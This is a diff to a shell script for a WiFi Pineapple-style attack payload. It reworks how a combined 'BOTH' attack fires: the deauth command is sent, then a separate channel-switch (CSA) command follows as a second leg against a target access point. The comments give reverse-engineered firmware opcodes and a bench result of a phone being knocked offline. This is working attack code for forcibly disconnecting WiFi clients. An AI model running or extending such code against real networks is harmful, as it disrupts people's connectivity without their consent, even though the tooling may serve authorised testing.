@@ -592,7 +592,13 @@ response_cmd() {
   case "$1" in
     DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
-    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
+    # BOTH is the opcode-400 deauth, and resp_fire issues the CSA as a SECOND command. It is not
+    # _ALL: StartDeauthAll emits li a0,402 (0x0086c62c), the same command id as StartDeauthCsa, so
+    # PINEAPPLE_DEAUTH_CLIENT_ALL is the CSA command under another name and builds no deauth frame
+    # at all. pineapd HAS a deauth+CSA opcode -- 401, dispatched correctly at 0x473528 -- but no
+    # shipped command sends it (li/ori a0,401 occur zero times in the Go daemon), so the only way
+    # to get what 401 would have done is to send both ourselves. CLAUDE.md "Third contact".
+    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     *)      printf '' ;;
   esac
 }
@@ -655,10 +661,14 @@ posture_expect() {
   # NOTE a real "both" is still available to us and is NOT implemented here: issue DEAUTH (400) and
   # CSA (402) as two commands. That changes what the radio transmits, so it is the operator's call.
   # Falsified by: _ALL or _CSA disconnecting any client, on any firmware, from any caller.
-  case "$k" in CSA|BOTH) printf 'fw-broken'; return 0 ;; esac
+  case "$k" in CSA) printf 'fw-broken'; return 0 ;; esac
   [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
   case "$k" in
     DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
+    # BOTH is that same deauth plus a CSA that cannot land, so the badge governs the half that can.
+    # "deauth only" promises the deauth and says the CSA is along for the ride, which is the honest
+    # label for a two-command attack whose second command is a known no-op on this firmware.
+    BOTH)        case "$b" in 'D+C') printf 'deauth only' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
     *)           printf 'unknown' ;;
   esac
 }
@@ -2025,6 +2035,24 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
     for m in "${subjects[@]}"; do resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "${P0[$m]}" - CMD_REFUSED "$m"; done
     set_state RESPOND_NIL; return 1
+  fi
+  # The CSA half of BOTH, issued as its own command because no firmware command combines them (see
+  # response_cmd: _ALL is the CSA opcode under another name, and pineapd's real deauth+CSA opcode
+  # 401 is dead code no command reaches). A refused CSA leg must NOT fail the attempt -- the deauth
+  # has already left -- so it warns and the loot records which legs went out.
+  if [ "$k" = BOTH ]; then
+    local csa_cmd csa_rc csa_err
+    csa_cmd=$(response_cmd CSA)
+    if [ -n "$csa_cmd" ] && command -v "$csa_cmd" >/dev/null 2>&1; then
+      : >"$FIRE_ERR"
+      "$csa_cmd" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"; csa_rc=$?
+      csa_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+      log resp "cmd $csa_cmd rc=$csa_rc${csa_err:+ err=${csa_err:0:120}}"
+      if (( csa_rc == 0 )) && [ -z "$csa_err" ]; then cmd="$cmd+CSA"
+      else LOG yellow "CSA leg refused; the deauth was still sent"; fi
+    else
+      log resp "csa leg skipped: $csa_cmd not present"
+    fi
   fi
   # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
   # PINEAPPLE_DEAUTH_CLIENT dropped it immediately, while PINEAPPLE_DEAUTH_CLIENT_ALL and
